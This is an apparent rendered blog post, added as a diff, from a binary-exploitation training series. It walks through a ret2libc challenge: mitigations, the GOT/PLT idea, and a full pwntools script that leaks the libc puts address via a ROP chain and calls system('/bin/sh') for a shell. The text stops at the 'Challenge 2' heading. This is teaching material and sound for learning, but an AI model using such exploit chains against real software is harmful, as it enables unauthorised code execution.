@@ -1,0 +1,142 @@
+I"�.<p><img src="/assets/images/pwntraining3/pwntrain1.png" alt="" /></p>
+
+<h3 id="introduction">Introduction:</h3>
+
+<p>In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.</p>
+
+<h3 id="challenge-1">Challenge 1:</h3>
+
+<p>Here we are given a binary and the source for the binary.</p>
+
+<p><a href="/assets/images/pwntraining3/ret2libc">vuln binary</a> and 
+<a href="/assets/images/pwntraining3/ret2libc.c">vuln c code</a></p>
+
+<h3 id="solution">Solution:</h3>
+
+<h4 id="mitigations">Mitigations:</h4>
+
+<p>Lets check out the mitigations for this program.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./ret2libc
+</code></pre></div></div>
+
+<p><img src="/assets/images/pwntraining3/pwntrain2.png" alt="" /></p>
+
+<p>If you don’t have checksec installed then</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
+</code></pre></div></div>
+
+<p>RELRO:</p>
+<ul>
+  <li>Partial RELRO - the got is writeable, nothing much to bother here.</li>
+</ul>
+
+<p>CANARY:</p>
+<ul>
+  <li>No canary, we can do a overflow peacefully :)</li>
+</ul>
+
+<p>No eXecute:</p>
+<ul>
+  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.</li>
+</ul>
+
+<p>PIE:</p>
+<ul>
+  <li>PIE Disabled, we know the address of all the code in the binary.</li>
+</ul>
+
+<h4 id="code-walkthrough">Code walkthrough:</h4>
+
+<p>main function:</p>
+
+<p><img src="/assets/images/pwntraining3/pwntrain3.png" alt="" /></p>
+
+<p>Its simple and easy, just overflow the buffer with garbage value and fill the return with… with… wait… with what ? Since there is no win function as such what exactly will we do ? Can we somehow get a shell by leaking something ? Lets look at the idea behind this challenge.</p>
+
+<h4 id="global-offset-table">Global Offset Table:</h4>
+
+<p>This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about <a href="https://tourpran.me/blogs/2020/09/13/got-plt.html">Global offset table go ahead to my old blog</a>.</p>
+
+<h4 id="exploit-idea">Exploit Idea:</h4>
+
+<p>Our aim right now, is to leak an address in the libc (shared library). The reason is because we are not given any helper funciton in our program to get a shell, so we use the function in the libc called system with arguments “/bin/sh” to get a shell.</p>
+
+<p>→ We can use the puts function since its already called by our program, so the GOT of this function will be resolved ( real address pointing to libc will be filled ).</p>
+
+<p>→ puts function takes one input which is the string to be printed. What if we can call puts with puts ?  :thinking:</p>
+
+<h4 id="pseudo-code">Pseudo code:</h4>
+
+<p><strong>note</strong>: arguments to functions are stored via registers, the first argument is stored in RDI.</p>
+
+<pre><code class="language-.">"A"*(offset) + p64(address of pop RDI) +  p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main)
+</code></pre>
+
+<p>This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address.</p>
+
+<ul>
+  <li>Now we have the libc puts address.</li>
+  <li>All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another.</li>
+  <li>we can calculate the address of string “/bin/sh” and the address of system function, then we can call the system with the argument to pop a shell.</li>
+</ul>
+
+<p><strong>note:</strong> You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.</p>
+
+<h4 id="exploit">Exploit:</h4>
+
+<p>In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to <a href="https://libc.blukat.me/">libc.blukat.me</a>.</p>
+
+<p>So always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.</p>
+
+<p><img src="/assets/images/pwntraining3/pwntrain4.png" alt="" /></p>
+
+<p>Below is the commented solution.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Set up pwntools for the correct architecture
+</span><span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2libc'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ret2libc"</span><span class="p">)</span>
+
+<span class="c1"># ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="c1"># ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+b* 0x00000000004011c7
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv the output sent by the program.
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401016</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">main</span><span class="p">))</span>
+<span class="c1"># filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
+</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># recv unwanted bytes.
+</span><span class="n">leak_puts</span> <span class="o">=</span><span class="nb">hex</span><span class="p">(</span> <span class="n">u64</span><span class="p">((</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)))</span> <span class="c1"># recv the puts function and strip the front and back, unpack it and store it as hex.
+</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"puts: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">))</span> <span class="c1"># make sure you get a address in the libc by logging it.
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Are you in?"</span><span class="p">)</span> <span class="c1"># recv output.
+</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"C"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040122b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x13000a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">leak_puts</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x32190</span><span class="p">))</span>
+<span class="c1"># fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.
+</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h3 id="challenge-2">Challenge 2</h3>
+:ET
